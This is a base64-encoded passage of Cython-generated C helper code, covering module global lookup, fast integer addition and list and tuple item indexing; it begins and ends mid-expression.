ZGljdHB0ciA9IChsaWtlbHkob2Zmc2V0ID4gMCkpID8gKFB5T2JqZWN0ICoqKSAoKGNoYXIgKilvYmogKyBvZmZzZXQpIDogX1B5T2JqZWN0X0dldERpY3RQdHIob2JqKTtcbiNlbHNlXG4gICAgICAgIGRpY3RwdHIgPSBfUHlPYmplY3RfR2V0RGljdFB0cihvYmopO1xuI2VuZGlmXG4gICAgfVxuICAgIHJldHVybiAoZGljdHB0ciAmJiAqZGljdHB0cikgPyBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKCpkaWN0cHRyKSA6IDA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfb2JqZWN0X2RpY3RfdmVyc2lvbl9tYXRjaGVzKFB5T2JqZWN0KiBvYmosIFBZX1VJTlQ2NF9UIHRwX2RpY3RfdmVyc2lvbiwgUFlfVUlOVDY0X1Qgb2JqX2RpY3RfdmVyc2lvbikge1xuICAgIFB5T2JqZWN0ICpkaWN0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0O1xuICAgIGlmICh1bmxpa2VseSghZGljdCkgfHwgdW5saWtlbHkodHBfZGljdF92ZXJzaW9uICE9IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkpKVxuICAgICAgICByZXR1cm4gMDtcbiAgICByZXR1cm4gb2JqX2RpY3RfdmVyc2lvbiA9PSBfX1B5eF9nZXRfb2JqZWN0X2RpY3RfdmVyc2lvbihvYmopO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShQeU9iamVjdCAqbmFtZSwgUFlfVUlOVDY0X1QgKmRpY3RfdmVyc2lvbiwgUHlPYmplY3QgKipkaWN0X2NhY2hlZF92YWx1ZSlcbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpXG4jZW5kaWZcbntcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X20pKSB7XG4gICAgICAgIGlmICghUHlFcnJfT2NjdXJyZWQoKSlcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfTmFtZUVycm9yKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5T2JqZWN0X0dldEF0dHIoX19weXhfbSwgbmFtZSk7XG4gICAgaWYgKGxpa2VseShyZXN1bHQpKSB7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgIFB5RXJyX0NsZWFyKCk7XG4jZWxpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTXG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5RGljdF9HZXRJdGVtUmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIG5hbWUsICZyZXN1bHQpID09IC0xKSkgUHlFcnJfQ2xlYXIoKTtcbiAgICBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCByZXN1bHQsICpkaWN0X2NhY2hlZF92YWx1ZSwgKmRpY3RfdmVyc2lvbilcbiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4jZWxzZVxuICAgIHJlc3VsdCA9IF9QeURpY3RfR2V0SXRlbV9Lbm93bkhhc2goX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgbmFtZSwgKChQeUFTQ0lJT2JqZWN0ICopIG5hbWUpLT5oYXNoKTtcbiAgICBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCByZXN1bHQsICpkaWN0X2NhY2hlZF92YWx1ZSwgKmRpY3RfdmVyc2lvbilcbiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihyZXN1bHQpO1xuICAgIH1cbiAgICBQeUVycl9DbGVhcigpO1xuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X0dldEJ1aWx0aW5OYW1lKG5hbWUpO1xufVxuXG5cbiNpZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSwgaW50IHdpdGhfZXJyb3IpIHtcbiAgICBQeU9iamVjdCAqcmVzO1xuICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7XG4gICAgcmVzID0gX1B5VHlwZV9Mb29rdXAodHAsIGF0dHJfbmFtZSk7XG4gICAgaWYgKGxpa2VseShyZXMpKSB7XG4gICAgICAgIGRlc2NyZ2V0ZnVuYyBmID0gUHlfVFlQRShyZXMpLT50cF9kZXNjcl9nZXQ7XG4gICAgICAgIGlmICghZikge1xuICAgICAgICAgICAgUHlfSU5DUkVGKHJlcyk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXMgPSBmKHJlcywgb2JqLCAoUHlPYmplY3QgKil0cCk7XG4gICAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHdpdGhfZXJyb3IpIHtcbiAgICAgICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX0F0dHJpYnV0ZUVycm9yLCBhdHRyX25hbWUpO1xuICAgIH1cbiAgICByZXR1cm4gcmVzO1xufVxuI2VuZGlmXG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgaW50IGlucGxhY2UpIHtcbiAgICByZXR1cm4gKGlucGxhY2UgPyBQeU51bWJlcl9JblBsYWNlQWRkIDogUHlOdW1iZXJfQWRkKShvcDEsIG9wMik7XG59XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1VucGFja2VkX19fUHl4X1B5TG9uZ19BZGRPYmpDKFB5T2JqZWN0ICpvcDEsIFB5T2JqZWN0ICpvcDIsIGxvbmcgaW50dmFsLCBpbnQgaW5wbGFjZSwgaW50IHplcm9kaXZpc2lvbl9jaGVjaykge1xuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGlucGxhY2UpO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgY29uc3QgbG9uZyBiID0gaW50dmFsO1xuICAgIGxvbmcgYTtcbiAgICBjb25zdCBQWV9MT05HX0xPTkcgbGxiID0gaW50dmFsO1xuICAgIFBZX0xPTkdfTE9ORyBsbGE7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5TG9uZ19Jc1plcm8ob3AxKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihvcDIpO1xuICAgIH1cbiAgICBjb25zdCBpbnQgaXNfcG9zaXRpdmUgPSBfX1B5eF9QeUxvbmdfSXNQb3Mob3AxKTtcbiAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyhvcDEpO1xuICAgIGNvbnN0IFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KG9wMSk7XG4gICAgaWYgKGxpa2VseShzaXplID09IDEpKSB7XG4gICAgICAgIGEgPSAobG9uZykgZGlnaXRzWzBdO1xuICAgICAgICBpZiAoIWlzX3Bvc2l0aXZlKSBhICo9IC0xO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHN3aXRjaCAoc2l6ZSkge1xuICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGlmICghaXNfcG9zaXRpdmUpIGEgKj0gLTE7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gY2FsY3VsYXRlX2xvbmc7XG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBsbGEgPSAoUFlfTE9OR19MT05HKSAoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBpZiAoIWlzX3Bvc2l0aXZlKSBsbGEgKj0gLTE7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gY2FsY3VsYXRlX2xvbmdfbG9uZztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICBjYXNlIDM6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBpZiAoIWlzX3Bvc2l0aXZlKSBhICo9IC0xO1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGNhbGN1bGF0ZV9sb25nO1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoOCAqIHNpemVvZihQWV9MT05HX0xPTkcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgbGxhID0gKFBZX0xPTkdfTE9ORykgKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGlmICghaXNfcG9zaXRpdmUpIGxsYSAqPSAtMTtcbiAgICAgICAgICAgICAgICAgICAgZ290byBjYWxjdWxhdGVfbG9uZ19sb25nO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFpc19wb3NpdGl2ZSkgYSAqPSAtMTtcbiAgICAgICAgICAgICAgICAgICAgZ290byBjYWxjdWxhdGVfbG9uZztcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFpc19wb3NpdGl2ZSkgbGxhICo9IC0xO1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGNhbGN1bGF0ZV9sb25nX2xvbmc7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBQeUxvbmdfVHlwZS50cF9hc19udW1iZXItPm5iX2FkZChvcDEsIG9wMik7XG4gICAgfVxuICAgIGNhbGN1bGF0ZV9sb25nOlxuICAgICAgICB7XG4gICAgICAgICAgICBsb25nIHg7XG4gICAgICAgICAgICB4ID0gYSArIGI7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nKHgpO1xuICAgICAgICB9XG4gICAgY2FsY3VsYXRlX2xvbmdfbG9uZzpcbiAgICAgICAge1xuICAgICAgICAgICAgUFlfTE9OR19MT05HIGxseDtcbiAgICAgICAgICAgIGxseCA9IGxsYSArIGxsYjtcbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmdMb25nKGxseCk7XG4gICAgICAgIH1cbiAgICBcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GbG9hdF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqZmxvYXRfdmFsLCBsb25nIGludHZhbCwgaW50IHplcm9kaXZpc2lvbl9jaGVjaykge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgY29uc3QgbG9uZyBiID0gaW50dmFsO1xuICAgIGRvdWJsZSBhID0gX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoZmxvYXRfdmFsKTtcbiAgICAgICAgZG91YmxlIHJlc3VsdDtcbiAgICAgICAgXG4gICAgICAgIHJlc3VsdCA9ICgoZG91YmxlKWEpICsgKGRvdWJsZSliO1xuICAgICAgICByZXR1cm4gUHlGbG9hdF9Gcm9tRG91YmxlKHJlc3VsdCk7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaW50dmFsKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUih6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KG9wMSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICBpZiAoUHlGbG9hdF9DaGVja0V4YWN0KG9wMSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgaW50dmFsLCB6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGlucGxhY2UpO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMoUHlPYmplY3QgKm8sIFB5T2JqZWN0KiBqKSB7XG4gICAgUHlPYmplY3QgKnI7XG4gICAgaWYgKHVubGlrZWx5KCFqKSkgcmV0dXJuIE5VTEw7XG4gICAgciA9IFB5T2JqZWN0X0dldEl0ZW0obywgaik7XG4gICAgUHlfREVDUkVGKGopO1xuICAgIHJldHVybiByO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfTGlzdF9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2ssIGludCB1bnNhZmVfc2hhcmVkKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIodW5zYWZlX3NoYXJlZCk7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBQeV9zc2l6ZV90IHdyYXBwZWRfaSA9IGk7XG4gICAgaWYgKHdyYXBhcm91bmQgJiB1bmxpa2VseShpIDwgMCkpIHtcbiAgICAgICAgd3JhcHBlZF9pICs9IFB5TGlzdF9HRVRfU0laRShvKTtcbiAgICB9XG4gICAgaWYgKChDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIHx8ICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWZGYXN0KG8sIHdyYXBwZWRfaSwgdW5zYWZlX3NoYXJlZCk7XG4gICAgfSBlbHNlXG4gICAgaWYgKCghYm91bmRzY2hlY2spIHx8IGxpa2VseShfX1B5eF9pc192YWxpZF9pbmRleCh3cmFwcGVkX2ksIFB5TGlzdF9HRVRfU0laRShvKSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoUHlMaXN0X0dFVF9JVEVNKG8sIHdyYXBwZWRfaSkpO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfR2V0SXRlbUludF9HZW5lcmljKG8sIFB5TG9uZ19Gcm9tU3NpemVfdChpKSk7XG4jZWxzZVxuICAgICh2b2lkKXdyYXBhcm91bmQ7XG4gICAgKHZvaWQpYm91bmRzY2hlY2s7XG4gICAgcmV0dXJuIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKTtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgd3JhcGFyb3VuZCwgaW50IGJvdW5kc2NoZWNrLCBpbnQgdW5zYWZlX3NoYXJlZCkge1xuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKHVuc2FmZV9zaGFyZWQpO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlfc3NpemVfdCB3cmFwcGVkX2kgPSBpO1xuICAgIGlmICh3cmFwYXJvdW5kICYgdW5saWtlbHkoaSA8IDApKSB7XG4gICAgICAgIHdyYXBwZWRfaSArPSBQeVR1cGxlX0dFVF9TSVpFKG8pO1xuICAgIH1cbiAgICBpZiAoKCFib3VuZHNjaGVjaykgfHwgbGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KHdyYXBwZWRfaSwgUHlUdXBsZV9HRVRfU0laRShvKSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoUHlUdXBsZV9HRVRfSVRFTShvLCB3cmFwcGVkX2kpKTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpO1xuI2Vsc2VcbiAgICAodm9pZCl3cmFwYXJvdW5kO1xuICAgICh2b2lkKWJvdW5kc2NoZWNrO1xuICAgIHJldHVybiBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSk7XG4jZW5kaWZcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSwgaW50IGlzX2xpc3QsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2ssIGludCB1bnNhZmVfc2hhcmVkKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIodW5zYWZlX3NoYXJlZCk7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIGlmIChpc19saXN0IHx8IFB5TGlzdF9DaGVja0V4YWN0KG8pKSB7XG4gICAgICAgIFB5X3NzaXplX3QgbiA9ICgoIXdyYXBhcm91bmQpIHwgbGlrZWx5KGkgPj0gMCkpID8gaSA6IGkgKyBQeUxpc3RfR0VUX1NJWkUobyk7XG4gICAgICAgIGlmICgoQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgfHwgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUykpIHtcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZkZhc3QobywgbiwgdW5zYWZlX3NoYXJlZCk7XG4gICAgICAgIH0gZWxzZSBpZiAoKCFib3VuZHNjaGVjaykgfHwgKGxpa2VseShfX1B5eF9pc192YWxpZF9pbmRleChuLCBQeUxpc3RfR0VUX1NJWkUobykpKSkpIHtcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoUHlMaXN0X0dFVF9JVEVNKG8sIG4pKTtcbiAgICAgICAgfVxuICAgIH0gZWxzZVxuICAgICNpZiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBpZiAoUHlUdXBsZV9DaGVja0V4YWN0KG8pKSB7XG4gICAgICAgIFB5X3NzaXplX3QgbiA9ICgoIXdyYXBhcm91bmQpIHwgbGlrZWx5KGkgPj0gMCkpID8gaSA6IGkgKyBQeVR1cGxlX0dFVF9TSVpFKG8pO1xuICAgICAgICBpZiAoKCFib3VuZHNjaGVjaykgfHwgbGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KG4sIFB5VHVwbGVfR0VUX1NJWkUobykpKSkge1xuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihQeVR1cGxlX0dFVF9JVEVNKG8sIG4pKTtcbiAgICAgICAgfVxuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuI2VuZGlmXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICB7XG4gICAgICAgIFB5TWFwcGluZ01ldGhvZHMgKm1tID0gUHlfVFlQRShvKS0+dHBfYXNfbWFwcGluZztcbiAgICAgICAgUHlTZXF1ZW5jZU1ldGhvZHMgKnNtID0gUHlfVFlQRShvKS0+dHBfYXNfc2VxdWVuY2U7XG4gICAgICAgIGlmICghaXNfbGlzdCAmJiBtbSAmJiBtbS0+bXBfc3Vic2NyaXB0KSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqciwgKmtleSA9IFB5TG9uZ19Gcm9tU3NpemVfdChpKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSgha2V5KSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICByID0gbW0tPm1wX3N1YnNjcmlwdChvLCBrZXkpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGtleSk7XG4gICAgICAgICAgICByZXR1cm4gcjtcbiAgICAgICAgfVxuICAgICAgICBpZiAoaXNfbGlzdCB8fCBsaWtlbHkoc20gJiYgc20tPnNxX2l0ZW0pKSB7XG4gICAgICAgICAgICBpZiAod3JhcGFyb3VuZCAmJiB1bmxpa2VseShpIDwgMCkgJiYgbGlrZWx5KHNtLT5zcV9sZW5ndGgpKSB7XG4gICAgICAgICAgICAgICAgUHlfc3NpemVfdCBsID0gc20tPnNxX2xlbmd0aChvKTtcbiAgICAgICAgICAgICAgICBpZiAobGlrZWx5KGwgPj0gMCkpIHtcbiAgICAgICAgICAgICAgICAgICAgaSArPSBsO1xuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIGlmICghUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19PdmVyZmxvd0Vycm9yKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJldHVybiBzbS0+c3FfaXRlbShvLCBpKTtcbiAgICAgICAgfVxuICAgIH1cbiNlbHNlXG4gICAgaWYgKGlzX2xpc3QgfHwgIVB5TWFwcGluZ19DaGVjayhvKSkge1xuICAgICAgICByZXR1cm4gUHlTZXF1ZW5jZV9HZXRJdGVtKG8sIGkpO1xuICAgIH1cbiNlbmRpZlxuICAgICh2b2lkKXdyYXBhcm91bmQ7XG4gICAgKHZvaWQpYm91bmRzY2hlY2s7XG4gICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpO1xufVxuXG5cbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SW5kZXgoUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKmluZGV4KSB7XG4gICAgUHlPYmplY3QgKnJ1bmVyciA9IE5VTEw7XG4gICAgUHlfc3NpemVfdCBrZXlfdmFsdWU7XG4gICAga2V5X3ZhbHVlID0gX19QeXhfUHlJbmRleF9Bc1NzaXplX3QoaW5kZXgpO1xuICAgIGlmIChsaWtlbHkoa2V5X3ZhbHVlICE9IC0xIHx8ICEocnVuZXJyID0gUHlFcnJfT2NjdXJyZWQoKSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9HZXRJdGVtSW50X0Zhc3Qob2JqLCBrZXlfdmFsdWUsIDAsIDEsIDEsIDEpO1xuICAgIH1cbiAgICBpZiAoUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKHJ1bmVyciwgUHlFeGNfT3ZlcmZsb3dFcnJvcikpIHtcbiAgICAgICAgX19QeXhfVHlwZU5hbWUgaW5kZXhfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKGluZGV4KSk7XG4gICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19JbmRleEVycm9yLFxuICAgICAgICAgICAgImNhbm5vdCBmaXQgXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgaW50byBhbiBpbmRleC1zaXplZCBpbnRlZ2VyIiwgaW5kZXhfdHlwZV9uYW1lKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKGluZGV4X3R5cGVfbmFtZSk7XG4gICAgfVxuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9HZXRJdGVtX1Nsb3coUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKmtleSkge1xuICAgIF9fUHl4X1R5cGVOYW1lIG9ial90eXBlX25hbWU7XG4gICAgaWYgKGxpa2VseShQeVR5cGVfQ2hlY2sob2JqKSkpIHtcbiAgICAgICAgUHlPYmplY3QgKm1ldGggPSBfX1B5eF